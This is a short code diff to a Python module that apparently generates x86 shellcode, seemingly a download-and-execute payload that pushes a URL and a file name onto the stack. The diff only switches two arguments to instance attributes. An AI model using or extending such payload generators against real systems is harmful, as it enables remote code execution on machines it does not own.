@@ -78,12 +78,12 @@ class Module(base_module.BaseModule):
         payload += "call   *%esi"
         payload += "xor    %ecx,%ecx"
         payload += "push   %ecx"
-        payload += stack.generate(url, "%ecx", "string")
+        payload += stack.generate(self.url, "%ecx", "string")
         payload += "xor    %edi,%edi"
         payload += "mov    %esp,%edi"
         payload += "xor    %ecx,%ecx"
         payload += "push   %ecx"
-        payload += stack.generate(filename, "%ecx","string")
+        payload += stack.generate(self.filename, "%ecx", "string")
         payload += "xor    %edx,%edx"
         payload += "mov    %esp,%edx"
         payload += "xor    %ecx,%ecx"
